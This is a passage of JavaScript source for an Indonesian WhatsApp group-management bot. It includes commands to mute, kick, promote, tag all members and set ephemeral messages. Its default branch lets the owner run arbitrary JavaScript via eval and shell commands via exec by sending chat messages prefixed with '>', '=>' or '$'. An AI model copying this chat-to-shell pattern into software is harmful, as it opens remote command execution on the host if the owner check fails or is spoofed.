                if (!isAdmins) return reply(mess.admin)
                if (args[0] === "on") {
                if (db.data.chats[m.chat].mute) return m.reply(`Sᴜᴅᴀʜ Aᴋᴛɪғ Kᴀᴋ !`)
                db.data.chats[m.chat].mute = true
                m.reply(`Bᴇʀʜᴀsɪʟ, Gʀᴜᴘ ᴛᴇʟᴀʜ ᴅɪ ʜᴇɴɪɴɢᴋᴀɴ ᴏʟᴇʜ ⟨ *${tganz.user.name}* ⟩`)
                } else if (args[0] === "off") {
                if (!db.data.chats[m.chat].mute) return m.reply(`Sᴜᴅᴀʜ Oғғ Kᴀᴋ !`)
                db.data.chats[m.chat].mute = false
                m.reply(`Bᴇʀʜᴀsɪʟ, Gʀᴜᴘ ᴛɪᴅᴀᴋ ʟᴀɢɪ ᴅɪ ʜᴇɴɪɴɢᴋᴀɴ ᴏʟᴇʜ ⟨ *${tganz.user.name}* ⟩`)
                } else {
                 let buttons = [
                        { buttonId: '.mute on', buttonText: { displayText: '🛡️ ON' }, type: 1 },
                        { buttonId: '.mute off', buttonText: { displayText: 'OFF 🐾' }, type: 1 }
                    ]
                    await tganz.sendButtonText(m.chat, buttons, `*❑ Pɪʟɪʜ ʙᴜᴛᴛᴏɴ ᴅɪ ʙᴀᴡᴀʜ ɪɴɪ ᴜɴᴛᴜᴋ ᴍᴇɴɢᴀᴋᴛɪғᴋᴀɴ ᴀᴛᴀᴜ ᴍᴇᴍᴀᴛɪᴋᴀɴ ғɪᴛᴜʀ ${command} !*`, footer_text, m)
                }
            }
             break
            case 'welcome': {
   if (isBan) return reply(mess.ban)
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.botAdmin)
if (!isAdmins && !isCreator) return reply(mess.admin)
if (args[0] === "on") {
if (isWelcome) return reply(`Sᴜᴅᴀʜ Aᴋᴛɪғ Kᴀᴋ !`)
_welcome.push(m.chat)
fs.writeFileSync('./database/welcome.json', JSON.stringify(_welcome, null, 2))
reply('Fɪᴛᴜʀ ᴘᴇɴʏᴀᴍʙᴜᴛᴀɴ sᴇʟᴀᴍᴀᴛ ᴅᴀᴛᴀɴɢ sᴜᴅᴀʜ ᴅɪ ᴀᴋᴛɪғᴋᴀɴ !')
}
else if (args[0] === "off") {
if (!isWelcome) return reply(`Sᴜᴅᴀʜ Oғғ Kᴀᴋ !`)
let anu = _welcome.indexOf(m.chat)
_welcome.splice(anu, 1)
fs.writeFileSync('./database/welcome.json', JSON.stringify(_welcome, null, 2))
reply('Fɪᴛᴜʀ ᴘᴇɴʏᴀᴍʙᴜᴛᴀɴ sᴇʟᴀᴍᴀᴛ ᴅᴀᴛᴀɴɢ sᴜᴅᴀʜ ᴅɪ ᴍᴀᴛɪᴋᴀɴ !')
} else {
  let buttonswlcm = [
  { buttonId: `.${command} on`, buttonText: { displayText: '🛡️ ON' }, type: 1 },
  { buttonId: `.${command} off`, buttonText: { displayText: 'OFF 🐾' }, type: 1 }
  ]
  await tganz.sendButtonText(m.chat, buttonswlcm, `*❑ Pɪʟɪʜ ʙᴜᴛᴛᴏɴ ᴅɪ ʙᴀᴡᴀʜ ɪɴɪ ᴜɴᴛᴜᴋ ᴍᴇɴɢᴀᴋᴛɪғᴋᴀɴ ᴀᴛᴀᴜ ᴍᴇᴍᴀᴛɪᴋᴀɴ ғɪᴛᴜʀ ${command} !*`, footer_text, m)
  }
  }
  break
            case 'wpesan':
            case 'ephemeral': {
           if (isBan) return reply(mess.ban)
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.botAdmin)
if (!isAdmins && !isCreator) return reply(mess.admin)
                if (args[0] === '1') {
                    await tganz.groupToggleEphemeral(m.chat, 1*24*3600).then((res) => m.reply(`*Pᴇɴɢᴜʙᴀʜᴀɴ ᴡᴀᴋᴛᴜ ᴘᴇsᴀɴ sᴇᴍᴇɴᴛᴀʀᴀ ʙᴇʀʜᴀsɪʟ ᴅɪ ᴛᴇʀᴀᴘᴋᴀɴ, Pᴇsᴀɴ ɢʀᴜᴘ ɪɴɪ ᴀᴋᴀɴ ᴅɪ ʜᴀᴘᴜs ᴏᴛᴏᴍᴀᴛɪs sᴇᴛᴇʟᴀʜ 1 Hᴀʀɪ !!!*`)).catch((err) => m.reply(mess.error))
                } else if (args[0] === '7') {
                    await tganz.groupToggleEphemeral(m.chat, 7*24*3600).then((res) => m.reply(`*Pᴇɴɢᴜʙᴀʜᴀɴ ᴡᴀᴋᴛᴜ ᴘᴇsᴀɴ sᴇᴍᴇɴᴛᴀʀᴀ ʙᴇʀʜᴀsɪʟ ᴅɪ ᴛᴇʀᴀᴘᴋᴀɴ, Pᴇsᴀɴ ɢʀᴜᴘ ɪɴɪ ᴀᴋᴀɴ ᴅɪ ʜᴀᴘᴜs ᴏᴛᴏᴍᴀᴛɪs sᴇᴛᴇʟᴀʜ 7 Hᴀʀɪ !!!*`)).catch((err) => m.reply(mess.error))
                } else if (args[0] === '90') {
                    await tganz.groupToggleEphemeral(m.chat, 90*24*3600).then((res) => m.reply(`*Pᴇɴɢᴜʙᴀʜᴀɴ ᴡᴀᴋᴛᴜ ᴘᴇsᴀɴ sᴇᴍᴇɴᴛᴀʀᴀ ʙᴇʀʜᴀsɪʟ ᴅɪ ᴛᴇʀᴀᴘᴋᴀɴ, Pᴇsᴀɴ ɢʀᴜᴘ ɪɴɪ ᴀᴋᴀɴ ᴅɪ ʜᴀᴘᴜs ᴏᴛᴏᴍᴀᴛɪs sᴇᴛᴇʟᴀʜ 90 Hᴀʀɪ !!!*`)).catch((err) => m.reply(mess.error))
                } else if (args[0] === 'off') {
                    await tganz.groupToggleEphemeral(m.chat, 0).then((res) => m.reply(`*Pᴇsᴀɴ Sᴇᴍᴇɴᴛᴀʀᴀ ʙᴇʀʜᴀsɪʟ ᴅɪ ᴍᴀᴛɪᴋᴀɴ !!!*`)).catch((err) => m.reply(mess.error))
                } else {
                let sections = [
                {
                title: "❑ Pilih waktu pesan sementara :",
                rows: [
                {title: "⌲ 1 HARI", rowId: `.ephemeral 1`, description: `Pengubahan waktu pesan sementara grup menjadi 1 hari !`},
                {title: "⌲ 7 HARI", rowId: `.ephemeral 7`, description: `Pengubahan waktu pesan sementara grup menjadi 7 hari !`},
                {title: "⌲ 90 HARI", rowId: `.ephemeral 90`, description: `Pengubahan waktu pesan sementara grup menjadi 90 hari !`},
                {title: "⌲ MATIKAN", rowId: `.ephemeral off`, description: `Mematikan Waktu Pesan Sementara Pada Grup Ini !`}
                ]
                },
                ]
                tganz.sendListMsg(m.chat, `❑ Sɪʟᴀʜᴋᴀɴ ᴘɪʟɪʜ ᴡᴀᴋᴛᴜ ᴘᴇsᴀɴ sᴇᴍᴇɴᴛᴀʀᴀ !`, ``, `⌘ Hᴀɪ Kᴀᴋᴀᴋ ⟨ *${pushname}* ⟩`, `KLIK ⚙️`, sections, m)
                }
            }
            break
            case 'left':
            case 'goodbye': {
   if (isBan) return reply(mess.ban)
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.botAdmin)
if (!isAdmins && !isCreator) return reply(mess.admin)
if (args[0] === "on") {
if (isLeft) return reply('Sᴜᴅᴀʜ Aᴋᴛɪғ Kᴀᴋ !')
_left.push(m.chat)
fs.writeFileSync('./database/welcome.json', JSON.stringify(_left, null, 2))
reply('Fɪᴛᴜʀ ᴘᴇɴʏᴀᴍʙᴜᴛᴀɴ sᴇʟᴀᴍᴀᴛ ᴛɪɴɢɢᴀʟ sᴜᴅᴀʜ ᴅɪ ᴀᴋᴛɪғᴋᴀɴ !')
} else if (args[0] === "off") {
if (!isLeft) return reply('Sᴜᴅᴀʜ Oғғ Kᴀᴋ !')
let anu = _left.indexOf(m.chat)
_left.splice(anu, 1)
fs.writeFileSync('./database/welcome.json', JSON.stringify(_left, null, 2))
reply('Fɪᴛᴜʀ ᴘᴇɴʏᴀᴍʙᴜᴛᴀɴ sᴇʟᴀᴍᴀᴛ ᴛɪɴɢɢᴀʟ sᴜᴅᴀʜ ᴅɪ ᴍᴀᴛɪᴋᴀɴ !')
} else {
  let buttonsleft = [
  { buttonId: `.${command} on`, buttonText: { displayText: '🛡️ ON' }, type: 1 },
  { buttonId: `.${command} off`, buttonText: { displayText: 'OFF 🐾' }, type: 1 }
  ]
  await tganz.sendButtonText(m.chat, buttonsleft, `*❑ Pɪʟɪʜ ʙᴜᴛᴛᴏɴ ᴅɪ ʙᴀᴡᴀʜ ɪɴɪ ᴜɴᴛᴜᴋ ᴍᴇɴɢᴀᴋᴛɪғᴋᴀɴ ᴀᴛᴀᴜ ᴍᴇᴍᴀᴛɪᴋᴀɴ ғɪᴛᴜʀ ${command} !*`, footer_text, m)
  }
  }
  break
            case 'lyric':
            case 'lyrics':
            case 'lirik': {
               if (isBan) return reply(mess.ban)
            if(!text) return reply('Mᴀᴜ ᴄᴀʀɪ ʟɪʀɪᴋ ʟᴀɢᴜ ᴀᴘᴀ ᴋᴀᴋ ?')
           	const { lyrics, lyricsv2 } = require('@bochilteam/scraper')
            const result = await lyricsv2(text).catch(async _ => await lyrics(text))
            reply(`
${themeemoji} Nᴀᴍᴀ Lᴀɢᴜ : *${result.title}*
${themeemoji} Pᴇɴᴄɪᴘᴛᴀ : ${result.author}
${themeemoji} Lɪɴᴋ : ${result.link}
                               ⇓⇓⇓ Lɪʀɪᴋ Lᴀɢᴜ ⇓⇓⇓
⊙══════════════════════⊙
${result.lyrics}
⊙══════════════════════⊙
`.trim())
            }
            break
            case 'buka': {
               if (isBan) return reply(mess.ban)
                if (!m.isGroup) return reply('Hᴀɪ ᴋᴀᴋ, Fɪᴛᴜʀ ɪɴɪ ʜᴀɴʏᴀ ʙɪsᴀ ᴅɪɢᴜɴᴀᴋᴀɴ ᴅɪ ᴅᴀʟᴀᴍ ɢʀᴜᴘ. Sɪʟᴀʜᴋᴀɴ ᴍᴀsᴜᴋ ɢʀᴜᴘᴋᴜ ᴛᴇʀʟᴇʙɪʜ ᴅᴀʜᴜʟᴜ !\n\nʟɪɴᴋ ɢʀᴜᴘ :\nhttps://chat.whatsapp.com/BtryPpkWIKgBEqtYMKjnpz')
                if (!isAdmins) return reply('Hᴀɪ ᴋᴀᴋ, Fɪᴛᴜʀ ɪɴɪ ʜᴀɴʏᴀ ᴅᴀᴘᴀᴛ ᴅɪɢᴜɴᴀᴋᴀɴ ᴏʟᴇʜ Aᴅᴍɪɴ ɢʀᴜᴘ ɪɴɪ ʏᴀ ᴋᴀᴋ !')
                if (!isBotAdmins) return reply("Hᴀɪ ᴋᴀᴋ, Uɴᴛᴜᴋ ᴍᴇɴɢɢᴜɴᴀᴋᴀɴ ғɪᴛᴜʀ ɪɴɪ ᴊᴀᴅɪᴋᴀɴ ᴀᴋᴜ Aᴅᴍɪɴ ᴛᴇʀʟᴇʙɪʜ ᴅᴀʜᴜʟᴜ !")
                tganz.groupSettingUpdate(m.chat, 'not_announcement')
                reply(`Sᴜᴋsᴇs ᴍᴇɴɢɪᴢɪɴᴋᴀɴ sᴇᴍᴜᴀ Pᴇsᴇʀᴛᴀ ᴅᴀᴘᴀᴛ ᴍᴇɴɢɪʀɪᴍ ᴘᴇsᴀɴ ᴋᴇ ɢʀᴜᴘ ɪɴɪ !`)
            }
            break
           case "scnya":
           case "script":
           case "scriptnya":
           case "sc": {
            if (isBan) return reply(mess.ban)
          if (!text) return reply(`Mᴀᴜ sᴄʀɪᴘᴛɴʏᴀ ʏᴀ, ʜᴀʜᴀ ᴋᴀɢᴀ ʙᴏʟᴇʜ ᴍᴇɴᴅɪɴɢ ᴊᴏɪɴ ɢʀᴜᴘᴋᴜ ᴀᴊᴀ ʏᴜᴋ ᴅᴀʀɪ ᴘᴀᴅᴀ ɴᴀɴʏᴀɪɴ ʏᴀɴɢ ᴛᴀᴋ ᴊᴇʟᴀs ᴍᴇɴᴅɪɴɢ ᴊᴏɪɴ ɢʀᴜᴘᴋᴜ :\nhttps://chat.whatsapp.com/BtryPpkWIKgBEqtYMKjnpz`)
           }
              break
          case "run":
          case "r":
          case "runtime": {
            if (isBan) return reply(mess.ban)
          if (!text) return reply(`⚡ Wᴀᴋᴛᴜ ʙᴏᴛ ʙᴇʀᴊᴀʟᴀɴ : *${runtime(process.uptime())}*\n\n*© TᴇsᴛGᴀɴᴢ*`)
            }
               break
          case 'promote':
          case 'naik': {
            if (isBan) return reply(mess.ban)
            if (!m.isGroup) return reply(mess.group)
            if (!isBotAdmins) return reply(mess.botAdmin)
            if (!isAdmins) return reply(mess.admin)
            if (!quoted) return m.reply(`Hᴀɪ ᴋᴀᴋ, Sɪᴀᴘᴀ ʏᴀɴɢ ᴍᴀᴜ ᴅɪ ᴊᴀᴅɪᴋᴀɴ Aᴅᴍɪɴ ?`)
          		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
	          	await tganz.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => m.reply('Sᴇʟᴇsᴀɪ. Sᴇʟᴀᴍᴀᴛ ᴜɴᴛᴜᴋ ʏᴀɴɢ ʙᴀʀᴜ sᴀᴊᴀ ᴊᴀᴅɪ Aᴅᴍɪɴ ɢʀᴜᴘ ɪɴɪ 🥳')).catch((err) => m.reply('Pᴇɴᴀɪᴋᴀɴ ᴍᴇᴍʙᴇʀ ᴍᴇɴᴊᴀᴅɪ ᴀᴅᴍɪɴ ᴅɪʙᴀᴛᴀʟᴋᴀɴ ᴋᴀʀᴇɴᴀ ᴀᴅᴀ ᴍᴀsᴀʟᴀʜ ʏᴀɴɢ ᴛɪᴅᴀᴋ ᴅɪᴋᴇᴛᴀʜᴜɪ  !'))
          	}
         	break
         	case 'demote':
         	case 'turun': {
            if (isBan) return reply(mess.ban)
          		if (!m.isGroup) return reply(mess.group)
            if (!isBotAdmins) return reply(mess.botAdmin)
            if (!isAdmins) return reply(mess.admin)
            if (!quoted) return m.reply(`Hᴀɪ ᴋᴀᴋ, Sɪᴀᴘᴀ ʏᴀɴɢ ᴍᴀᴜ ᴅɪᴛᴜʀᴜɴᴋᴀɴ ᴊᴀʙᴀᴛᴀɴɴʏᴀ ?`)
          		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
	          	await tganz.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => m.reply('Sᴇʟᴇsᴀɪ, Jᴀɴɢᴀɴ ʟᴜᴘᴀ ʙᴇʀɪᴋᴀɴ ᴋᴇʙᴀʜᴀɢɪᴀᴀɴ ᴜɴᴛᴜᴋ ʏᴀɴɢ ʙᴀʀᴜ sᴀᴊᴀ ᴅɪ ᴊᴀᴅɪᴋᴀɴ ᴍᴇᴍʙᴇʀ ʟᴀɢɪ 😘')).catch((err) => m.reply('Pᴇɴᴜʀᴜɴᴀɴ ᴀᴅᴍɪɴ ᴍᴇɴᴊᴀᴅɪ ᴍᴇᴍʙᴇʀ ᴅɪʙᴀᴛᴀʟᴋᴀɴ ᴋᴀʀᴇɴᴀ ᴀᴅᴀ ᴍᴀsᴀʟᴀʜ ʏᴀɴɢ ᴛɪᴅᴀᴋ ᴅɪᴋᴇᴛᴀʜᴜɪ !'))
	       }
         	break
          case 'kick': {
            if (isBan) return reply(mess.ban)
         		if (!m.isGroup) return reply(mess.group)
           if (!isBotAdmins) return reply(mess.botAdmin)
           if (!isAdmins) return reply(mess.admin)
           if (!quoted) return m.reply(`Hᴀɪ ᴋᴀᴋ, Sɪᴀᴘᴀ ʏᴀɴɢ ᴍᴀᴜ ᴅɪ ᴋᴇʟᴜᴀʀᴋᴀɴ ?`)
	        		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
	        		await tganz.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => m.reply('Pᴇɴɢᴇʟᴜᴀʀᴀɴ ʙᴇʀʜᴀsɪʟ, Bᴇʀɪᴋᴀɴ sᴀᴍʙᴜᴛᴀɴ ᴜɴᴛᴜᴋ ᴍᴇᴍʙᴇʀ ʏᴀɴɢ ʙᴀʀᴜ sᴀᴊᴀ ᴋᴇʟᴜᴀʀ ᴅᴀʀɪ ɢʀᴜᴘ ɪɴɪ 🙌🏻')).catch((err) => m.reply('Mᴀᴀғ ᴋᴀᴋ ᴘᴇɴɢᴇʟᴜᴀʀᴀɴ ᴍᴇᴍʙᴇʀ ᴛɪᴅᴀᴋ ʙᴇʀʜᴀsɪʟ. Dɪᴋᴀʀᴇɴᴀᴋᴀɴ ᴍᴇᴍʙᴇʀ ᴛᴇʀsᴇʙᴜᴛ sᴜᴅᴀʜ ᴍᴇɴᴊᴀᴅɪ ᴀɴɢɢᴏᴛᴀ ᴛᴇʀʙᴀɪᴋ ᴅɪ ɢʀᴜᴘ ɪɴɪ !'))
	       	}
         	break		
	         case 'add': {
            if (isBan) return reply(mess.ban)
	          	if (!m.isGroup) return reply(mess.group)
            if (!isBotAdmins) return reply(mess.botAdmin)
            if (!isAdmins) return reply(mess.admin)
            if (!quoted) return m.reply(`Hᴀɪ ᴋᴀᴋ, Sɪᴀᴘᴀ ʏᴀɴɢ ᴍᴀᴜ ᴅɪ ᴛᴀᴍʙᴀʜᴋᴀɴ ?`)
	         		let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		        		await tganz.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => m.reply('Pᴇɴᴀᴍʙᴀʜᴀɴ ʙᴇʀʜᴀsɪʟ. Bᴇʀɪᴋᴀɴ sᴀᴍʙᴜᴛᴀɴ ᴜɴᴛᴜᴋ ᴍᴇᴍʙᴇʀ ʙᴀʀᴜ 🙌🏻\n\n*⫹⫺ Jɪᴋᴀ ɴᴏᴍᴏʀ ʏᴀɴɢ ᴅɪ ᴀᴅᴅ ᴛɪᴅᴀᴋ ᴀᴅᴀ ᴅɪ ᴅᴀʟᴀᴍ ɢʀᴜᴘ ɪɴɪ ʙᴇʀᴀʀᴛɪ ɴᴏᴍᴏʀ ᴛᴇʀsᴇʙᴜᴛ ʙᴀʀᴜ sᴀᴊᴀ ᴋᴇʟᴜᴀʀ ᴅᴀʀɪ ɢʀᴜᴘ ɪɴɪ ᴀᴛᴀᴜ ᴋᴏɴᴛᴀᴋ ᴛᴇʀsᴇʙᴜᴛ ᴅɪ ᴘʀɪᴠᴀᴛᴇ !*')).catch((err) => m.reply('Mᴀᴀғ ᴋᴀᴋ ᴘᴇɴᴀᴍʙᴀʜᴀɴ ᴍᴇᴍʙᴇʀ ᴛɪᴅᴀᴋ ʙᴇʀʜᴀsɪʟ. Kᴇᴍᴜɴɢᴋɪɴᴀɴ ᴍᴇᴍʙᴇʀ ᴅɪ ᴘʀɪᴠᴀᴛᴇ ᴀᴛᴀᴜ ʙᴀʀᴜ sᴀᴊᴀ ᴋᴇʟᴜᴀʀ ᴅᴀʀɪ ɢʀᴜᴘ ɪɴɪ. Cᴏʙᴀ ɴᴏᴍᴏʀ ʟᴀɪɴ ʏᴀ ᴋᴀᴋ !'))
		       }
         	break
         	case 'speedtest': 
         	case 'tspeed': 
         	case 'speed': 
         	case 'tes': 
         	case 'testing': 
         	case 'test': {
         	if (isBan) return reply(mess.ban)
            m.reply('_⚡ Tᴇsᴛɪɴɢ Sᴘᴇᴇᴅ.._.')
          try {
            let cp = require('child_process')
            let { promisify } = require('util')
            let exec = promisify(cp.exec).bind(cp)
          let o
          o = await exec('python3 speed.py')
          } catch (e) {
          o = e
         } finally {
        let { stdout, stderr } = o
        if (stdout.trim()) m.reply(stdout)
        if (stderr.trim()) m.reply(stderr)
            }
            }
            break
          case 'p':
         	case 'ping': 
         	case 'botstatus': 
         	case 'statusbot': {
            if (isBan) return reply(mess.ban)
                const used = process.memoryUsage()
                const cpus = os.cpus().map(cpu => {
                    cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
			        return cpu
                })
                const cpu = cpus.reduce((last, cpu, _, { length }) => {
                    last.total += cpu.total
                    last.speed += cpu.speed / length
                    last.times.user += cpu.times.user
                    last.times.nice += cpu.times.nice
                    last.times.sys += cpu.times.sys
                    last.times.idle += cpu.times.idle
                    last.times.irq += cpu.times.irq
                    return last
                }, {
                    speed: 0,
                    total: 0,
                    times: {
			            user: 0,
			            nice: 0,
			            sys: 0,
			            idle: 0,
			            irq: 0
                }
                })
                let timestamp = speed()
                let latensi = speed() - timestamp
                neww = performance.now()
                oldd = performance.now()
                respon = `
Kecepatan Respon ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\n⚡ Runtime : ${runtime(process.uptime())}

💻 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

_NodeJS Memory Usaage_
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}

${cpus[0] ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
                `.trim()
                m.reply(respon)
            }
            break
            case 'close':
            case 'tutup': {
            if (isBan) return reply(mess.ban)
                if (!m.isGroup) return reply('Hᴀɪ ᴋᴀᴋ, Fɪᴛᴜʀ ɪɴɪ ʜᴀɴʏᴀ ʙɪsᴀ ᴅɪɢᴜɴᴀᴋᴀɴ ᴅɪ ᴅᴀʟᴀᴍ ɢʀᴜᴘ. Sɪʟᴀʜᴋᴀɴ ᴍᴀsᴜᴋ ɢʀᴜᴘᴋᴜ ᴛᴇʀʟᴇʙɪʜ ᴅᴀʜᴜʟᴜ !\n\nʟɪɴᴋ ɢʀᴜᴘ :\nhttps://chat.whatsapp.com/BtryPpkWIKgBEqtYMKjnpz')
                if (!isAdmins) return reply('Hᴀɪ ᴋᴀᴋ, Fɪᴛᴜʀ ɪɴɪ ʜᴀɴʏᴀ ᴅᴀᴘᴀᴛ ᴅɪɢᴜɴᴀᴋᴀɴ ᴏʟᴇʜ Aᴅᴍɪɴ ɢʀᴜᴘ ɪɴɪ ʏᴀ ᴋᴀᴋ !')
                if (!isBotAdmins) return reply("Hᴀɪ ᴋᴀᴋ, Uɴᴛᴜᴋ ᴍᴇɴɢɢᴜɴᴀᴋᴀɴ ғɪᴛᴜʀ ɪɴɪ ᴊᴀᴅɪᴋᴀɴ ᴀᴋᴜ Aᴅᴍɪɴ ᴛᴇʀʟᴇʙɪʜ ᴅᴀʜᴜʟᴜ !")
                tganz.groupSettingUpdate(m.chat, 'announcement')
                reply(`Sᴜᴋsᴇs ᴍᴜʟᴀɪ sᴇᴋᴀʀᴀɴɢ ʜᴀɴʏᴀ ᴀᴅᴍɪɴ ʏᴀɴɢ ᴅᴀᴘᴀᴛ ᴍᴇɴɢɪʀɪᴍ ᴘᴇsᴀɴ ᴋᴇ ɢʀᴜᴘ ɪɴɪ !`)
            }
            break
            case 'tgme': 
            case 'tagme': {
            if (isBan) return reply(mess.ban)
            if (!m.isGroup) return reply("Hᴀɪ ᴋᴀᴋ, Fɪᴛᴜʀ ɪɴɪ ʜᴀɴʏᴀ ʙɪsᴀ ᴅɪɢᴜɴᴀᴋᴀɴ ᴅɪ ᴅᴀʟᴀᴍ ɢʀᴜᴘ. Sɪʟᴀʜᴋᴀɴ ᴍᴀsᴜᴋ ɢʀᴜᴘᴋᴜ ᴛᴇʀʟᴇʙɪʜ ᴅᴀʜᴜʟᴜ !\n\nʟɪɴᴋ ɢʀᴜᴘ :\nhttps://chat.whatsapp.com/BtryPpkWIKgBEqtYMKjnpz")
            let me = m.sender
            let jawab = `*@${me.split('@')[0]}*`
            let ments = [me]
            let buttons = [{ buttonId: '.menu', buttonText: { displayText: '⚙️ MENU ⚙️' }, type: 1 }]
            tganz.sendMessage(m.chat, {react: {text: kloadq,key: m.key}})
            await tganz.sendButtonText(m.chat, buttons, jawab, footer_text, m, {mentions: ments, quoted: m})
            }
            break
            case 'tagsemua':
            case 'tegal':
            case 'tagal':
            case 'tegall':
            case 'tagall': {
            if (isBan) return reply(mess.ban)
                if (!m.isGroup) return reply("Hᴀɪ ᴋᴀᴋ, Fɪᴛᴜʀ ɪɴɪ ʜᴀɴʏᴀ ʙɪsᴀ ᴅɪɢᴜɴᴀᴋᴀɴ ᴅɪ ᴅᴀʟᴀᴍ ɢʀᴜᴘ. Sɪʟᴀʜᴋᴀɴ ᴍᴀsᴜᴋ ɢʀᴜᴘᴋᴜ ᴛᴇʀʟᴇʙɪʜ ᴅᴀʜᴜʟᴜ !\n\nʟɪɴᴋ ɢʀᴜᴘ :\nhttps://chat.whatsapp.com/BtryPpkWIKgBEqtYMKjnpz")
                if (!isBotAdmins) return reply(mess.botAdmin)
                if (!(isAdmins || isCreator)) return reply("Hᴀɪ ᴋᴀᴋ, Fɪᴛᴜʀ ɪɴɪ ʜᴀɴʏᴀ ᴅᴀᴘᴀᴛ ᴅɪɢᴜɴᴀᴋᴀɴ ᴏʟᴇʜ Aᴅᴍɪɴ ɢʀᴜᴘ ɪɴɪ ʏᴀ ᴋᴀᴋ !")
            let hehe = '╔══✪〘 *Tᴀɢ - Sᴇᴍᴜᴀ* 〙✪═══\n'
            for (let mem of participants) {
                hehe += `╠➥ @${mem.id.split('@')[0]}\n`
            }
            hehe += '╚══✪〘 *© TᴇsᴛGᴀɴᴢ* 〙✪═══'
            await tganz.sendMessage(m.chat, { text: hehe, mentions: participants.map(a => a.id) }, { quoted: m })
            }
            break
            case 'pcouple':  
            case 'couplepp':  
            case 'couple':  
            case 'ppcp':  
            case 'imgppcouple':  
            case 'ppasangan':
            case 'ppcouple': {
            if (isBan) return reply(mess.ban)
                reply(mess.wait)
                let anu = await fetchJson('https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json')
                let random = anu[Math.floor(Math.random() * anu.length)]
                tganz.sendMessage(m.chat, { image: { url: random.male }, caption: `*🚹 Lᴀᴋɪ-Lᴀᴋɪ 🚹*` }, { quoted: m })
                tganz.sendMessage(m.chat, { image: { url: random.female }, caption: `*🚺 Pᴇʀᴇᴍᴘᴜᴀɴ 🚺*` }, { quoted: m })
            }
	             break
            case 'h': 
            case 'totag': 
            case 'hidetg': 
            case 'hidetag': {
            if (isBan) return reply(mess.ban)
               if (!quoted) return reply(`*Tᴇᴋsɴʏᴀ ᴍᴀɴᴀ ᴋᴀᴋ ?*`)
                if (!m.isGroup) return reply("Hᴀɪ ᴋᴀᴋ, Fɪᴛᴜʀ ɪɴɪ ʜᴀɴʏᴀ ʙɪsᴀ ᴅɪɢᴜɴᴀᴋᴀɴ ᴅɪ ᴅᴀʟᴀᴍ ɢʀᴜᴘ. Sɪʟᴀʜᴋᴀɴ ᴍᴀsᴜᴋ ɢʀᴜᴘᴋᴜ ᴛᴇʀʟᴇʙɪʜ ᴅᴀʜᴜʟᴜ !\n\nʟɪɴᴋ ɢʀᴜᴘ :\nhttps://chat.whatsapp.com/BtryPpkWIKgBEqtYMKjnpz")
                if (!isBotAdmins) return reply(mess.botAdmin)
                if (!(isAdmins || isCreator)) return reply("Hᴀɪ ᴋᴀᴋ, Fɪᴛᴜʀ ɪɴɪ ʜᴀɴʏᴀ ᴅᴀᴘᴀᴛ ᴅɪɢᴜɴᴀᴋᴀɴ ᴏʟᴇʜ Aᴅᴍɪɴ ɢʀᴜᴘ ɪɴɪ ʏᴀ ᴋᴀᴋ !")
                let tek = m.quoted ? quoted.text : (text ? text : "")
                tganz.sendMessage(m.chat, {
                    text: tek,
                    mentions: participants.map(a => a.id)
                }, {})
            }
            break

            default:
            if (budy.startsWith('=>')) {
                    if (!isCreator) return m.reply(mess.owner)
                    function Return(sul) {
                        sat = JSON.stringify(sul, null, 2)
                        bang = util.format(sat)
                            if (sat == undefined) {
                                bang = util.format(sul)
                            }
                            return m.reply(bang)
                    }
                    try {
                        m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
                    } catch (e) {
                        m.reply(String(e))
                    }
                }

                if (budy.startsWith('>')) {
                    if (!isCreator) return m.reply(mess.owner)
                    try {
                        let evaled = await eval(budy.slice(2))
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                        await m.reply(evaled)
                    } catch (err) {
                        await m.reply(String(err))
                    }
                }

                if (budy.startsWith('$')) {
                    if (!isCreator) return m.reply(mess.owner)
                    exec(budy.slice(2), (err, stdout) => {
                        if(err) return m.reply(err)
                        if (stdout) return m.reply(stdout)
                    })
                }
			
		if (isCmd && budy.toLowerCase() != undefined) {
		    if (m.chat.endsWith('broadcast')) return
		    if (m.isBaileys) return
		    let msgs = global.db.data.database
		    if (!(budy.toLowerCase() in msgs)) return
		    tganz.copyNForward(m.chat, msgs[budy.toLowerCase()], true)
		}
        }
        
    try {
    } catch (err) {
        m.reply(util.format(err))
    }
}

//——————————————「 Batas Akhir 」——————————————\\
let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`[❗] Pembaruan : ${__filename}`))
	delete require.cache[file]
	require(file)
})
//—————————————————————————————————————//